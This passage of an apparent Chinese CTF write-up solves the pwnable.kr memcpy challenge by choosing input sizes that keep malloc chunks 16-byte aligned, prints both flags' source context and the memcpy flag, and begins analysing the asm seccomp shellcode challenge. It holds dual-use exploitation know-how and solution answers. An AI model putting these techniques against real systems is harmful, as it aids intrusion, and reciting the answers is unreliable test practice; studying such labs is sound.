executed under memcpy_pwn privilege if you connect to port 9022.</span><br><span class="line">execute the binary by connecting to daemon(nc 0 9022).</span><br></pre></td></tr></table></figure><p>真实的可执行文件只能通过 <code>nc 0 9022</code> 访问, 下面是 memcpy.c 的源码(消去了flag)</p><p>memcpy.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">rdtsc</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"rdtsc"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        dest[i] = src[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    <span class="comment">// 64-byte block fast copy</span></span><br><span class="line">    <span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">        i = len / <span class="number">64</span>;</span><br><span class="line">        len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            __asm__ __volatile__ (</span><br><span class="line">                <span class="string">"movdqa (%0), %%xmm0\n"</span></span><br><span class="line">                <span class="string">"movdqa 16(%0), %%xmm1\n"</span></span><br><span class="line">                <span class="string">"movdqa 32(%0), %%xmm2\n"</span></span><br><span class="line">                <span class="string">"movdqa 48(%0), %%xmm3\n"</span></span><br><span class="line">                <span class="string">"movntps %%xmm0, (%1)\n"</span></span><br><span class="line">                <span class="string">"movntps %%xmm1, 16(%1)\n"</span></span><br><span class="line">                <span class="string">"movntps %%xmm2, 32(%1)\n"</span></span><br><span class="line">                <span class="string">"movntps %%xmm3, 48(%1)\n"</span></span><br><span class="line">                ::<span class="string">"r"</span>(src),<span class="string">"r"</span>(dest):<span class="string">"memory"</span>);</span><br><span class="line">            dest += <span class="number">64</span>;</span><br><span class="line">            src += <span class="number">64</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// byte-to-byte slow copy</span></span><br><span class="line">    <span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hey, I have a boring assignment for CS class.. :(\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The assignment is simple.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- What is the best implementation of memcpy?        -\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- 1. implement your own slow/fast version of memcpy -\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- 2. compare them with various size of data         -\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- 3. conclude your experiment and submit report     -\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This time, just help me out with my experiment and get flag\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No fancy hacking, I promise :D\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t1, t2;</span><br><span class="line">    <span class="keyword">int</span> e;</span><br><span class="line">    <span class="keyword">char</span>* src;</span><br><span class="line">    <span class="keyword">char</span>* dest;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> low, high;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="comment">// allocate memory</span></span><br><span class="line">    <span class="keyword">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> sizes[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// setup experiment parameters</span></span><br><span class="line">    <span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;    <span class="comment">// 2^13 = 8K</span></span><br><span class="line">        low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</span><br><span class="line">        high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"specify the memcpy amount between %d ~ %d : "</span>, low, high);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">        <span class="keyword">if</span>( size &lt; low || size &gt; high )&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"don't mess with the experiment.\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sizes[i++] = size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ok, lets run the experiment with your configuration\n"</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run experiment</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        size = sizes[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"experiment %d : memcpy with buffer size %d\n"</span>, i+<span class="number">1</span>, size);</span><br><span class="line">        dest = <span class="built_in">malloc</span>( size );</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);     <span class="comment">// to eliminate cache effect</span></span><br><span class="line">        t1 = rdtsc();</span><br><span class="line">        slow_memcpy(dest, src, size);       <span class="comment">// byte-to-byte memcpy</span></span><br><span class="line">        t2 = rdtsc();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span>, t2-t1);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);     <span class="comment">// to eliminate cache effect</span></span><br><span class="line">        t1 = rdtsc();</span><br><span class="line">        fast_memcpy(dest, src, size);       <span class="comment">// block-to-block memcpy</span></span><br><span class="line">        t2 = rdtsc();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span>, t2-t1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"thanks for helping my experiment!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag : ----- erased in this source code -----\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读了一遍源码, 好像真的是送分题...</p><p>试了一下, 每次都输入 high-1 , 结果执行了4次以后就没执行了, 大概是挂掉了,<br>果然没有这么好的事情...</p><p>但是在自己电脑上编译运行了一下, 又能成功, 非常的迷.</p><p>折腾半天愣是没弄懂为啥</p><p>无奈Google writeup, 发现里面提到在本地编译执行会看到 segmentation fault,<br>我看了看自己2.26的libc, 仿佛明白了什么...</p><p>果然换成2.23就出现 segmentation fault 了!...</p><p>gdb调试, 定位到段错误的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► 0x5655584c &lt;fast_memcpy+62&gt;    movntps xmmword ptr [edx], xmm0</span><br><span class="line">  0x5655584f &lt;fast_memcpy+65&gt;    movntps xmmword ptr [edx + 0x10], xmm1</span><br><span class="line">  0x56555853 &lt;fast_memcpy+69&gt;    movntps xmmword ptr [edx + 0x20], xmm2</span><br></pre></td></tr></table></figure><p>Google movntps指令, 发现了在保护模式下可能出现的几种异常</p><p> <a href="http://www.jaist.ac.jp/iscenter-new/mpc/altix/altixdata/opt/intel/vtune/doc/users_guide/mergedProjects/analyzer_ec/mergedProjects/reference_olh/mergedProjects/instructions/instruct32_hh/vc197.htm" target="_blank" rel="noopener">MOVNTPS--Move Aligned Four Packed Single-FP Non Temporal</a></p><table><thead><tr><th>错误码</th><th>原因</th></tr></thead><tbody><tr><td>#GP(0)</td><td>For an illegal memory operand effective address in the CS, DS, ES, FS or GS segments. If memory operand is not aligned on a 16-byte boundary, regardless of segment.</td></tr><tr><td>#SS(0)</td><td>For an illegal address in the SS segment.</td></tr><tr><td>#PF(fault-code)</td><td>For a page fault.</td></tr><tr><td>#NM</td><td>If TS in CR0 is set</td></tr><tr><td>#UD</td><td>If EM in CR0 is set. If OSFXSR in CR4 is 0. If CPUID feature flag SSE is 0.</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i registers edx</span><br><span class="line">edx            0x565594a8    1448449192</span><br></pre></td></tr></table></figure><p>查看edx的值, 发现没有对齐, 这大概就是产生段错误的原因了</p><p>查看源代码, 知道这个地方是dest的地址(果然还是看不惯AT&amp;T...</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__asm__ __volatile__ (</span><br><span class="line">    <span class="string">"movdqa (%0), %%xmm0\n"</span></span><br><span class="line">    <span class="string">"movdqa 16(%0), %%xmm1\n"</span></span><br><span class="line">    <span class="string">"movdqa 32(%0), %%xmm2\n"</span></span><br><span class="line">    <span class="string">"movdqa 48(%0), %%xmm3\n"</span></span><br><span class="line">    <span class="string">"movntps %%xmm0, (%1)\n"</span></span><br><span class="line">    <span class="string">"movntps %%xmm1, 16(%1)\n"</span></span><br><span class="line">    <span class="string">"movntps %%xmm2, 32(%1)\n"</span></span><br><span class="line">    <span class="string">"movntps %%xmm3, 48(%1)\n"</span></span><br><span class="line">    ::<span class="string">"r"</span>(src),<span class="string">"r"</span>(dest):<span class="string">"memory"</span>);</span><br></pre></td></tr></table></figure><p>查看 malloc 的相关实现(<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/heap_structure/#_3" target="_blank" rel="noopener">堆相关数据结构</a>)</p><p>可以看到 malloc 每次申请一个 chunk, 由于存在空间复用及对齐,<br>chunk的大小为<br><code>ceil((size + (2 - 1) * SIZE_SZ) / (2 * SIZE_S))) * 2 * SIZE_S</code></p><p>32位系统上SIZE_S为4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>直接通过以下脚本可以跑出一组数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">can = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>, <span class="number">8192</span> + <span class="number">1</span>) <span class="keyword">if</span> (ceil((i + <span class="number">4</span>) / <span class="number">8</span>) * <span class="number">8</span>) % <span class="number">16</span> == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>, <span class="number">14</span>):</span><br><span class="line">    num = [i <span class="keyword">for</span> i <span class="keyword">in</span> can <span class="keyword">if</span> pow(<span class="number">2</span>, _ - <span class="number">1</span>) &lt;= i &lt;= pow(<span class="number">2</span>, _)]</span><br><span class="line">    print(num[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">21</span><br><span class="line">37</span><br><span class="line">69</span><br><span class="line">133</span><br><span class="line">261</span><br><span class="line">517</span><br><span class="line">1029</span><br><span class="line">2053</span><br><span class="line">4101</span><br></pre></td></tr></table></figure><p>输入, 得到flag</p><p>flag: <code>1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</code></p><h1 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h1><blockquote><p>Mommy! I think I know how to make shellcodes</p><p>ssh <a href="mailto:asm@pwnable.kr" target="_blank" rel="noopener">asm@pwnable.kr</a> -p2222 (pw: guest)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">asm@ubuntu:~$ ls -l</span><br><span class="line">total 28</span><br><span class="line">-rwxr-xr-x 1 root root 13704 Nov 29  2016 asm</span><br><span class="line">-rw-r--r-- 1 root root  1793 Nov 29  2016 asm.c</span><br><span class="line">-rw-r--r-- 1 root root   211 Nov 19  2016 readme</span><br><span class="line">-rw-r--r-- 1 root root    67 Nov 19  2016 this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong</span><br></pre></td></tr></table></figure><p>readme</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">once you connect to port 9026, the &quot;asm&quot; binary will be executed under asm_pwn privilege.</span><br><span class="line">make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)</span><br></pre></td></tr></table></figure><p>asm.c</p><p>编译: gcc asm.c -o asm -lseccomp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">    <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="built_in">exit</span>), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (seccomp_load(ctx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        seccomp_release(ctx);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    seccomp_release(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> stub[] = <span class="string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> filter[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to shellcoding practice challenge.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* sh = (<span class="keyword">char</span>*)mmap(<span class="number">0x41414000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sh, <span class="number">0x90</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(sh, stub, <span class="built_in">strlen</span>(stub));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> offset = <span class="keyword">sizeof</span>(stub);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"give me your x64 shellcode: "</span>);</span><br><span class="line">    read(<span class="number">0</span>, sh+offset, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    alarm(<span class="number">10</span>);</span><br><span class="line">    chroot(<span class="string">"/home/asm_pwn"</span>);    <span class="comment">// you are in chroot jail. so you can't use symlink in /tmp</span></span><br><span class="line">    sandbox();</span><br><span class="line">    ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sh)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 pwntools 的 disasm 命令对stub进行反汇编,<br>可以看到这段代码对寄存器进行了清空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">9</span>]: context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: print(disasm(<span class="string">b'\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31</span></span><br><span class="line"><span class="string">    ...: \xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x3</span></span><br><span class="line"><span class="string">    ...: 1\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff'</span>))</span><br><span class="line">   <span class="number">0</span>:   <span class="number">48</span> <span class="number">31</span> c0                xor    rax,rax</span><br><span class="line">   <span class="number">3</span>:   <span class="number">48</span> <span class="number">31</span> db                xor    rbx,rbx</span><br><span class="line">   <span class="number">6</span>:   <span class="number">48</span> <span class="number">31</span> c9                xor    rcx,rcx</span><br><span class="line">   <span class="number">9</span>:   <span class="number">48</span> <span class="number">31</span> d2                xor    rdx,rdx</span><br><span class="line">   c:   <span class="number">48</span> <span class="number">31</span> 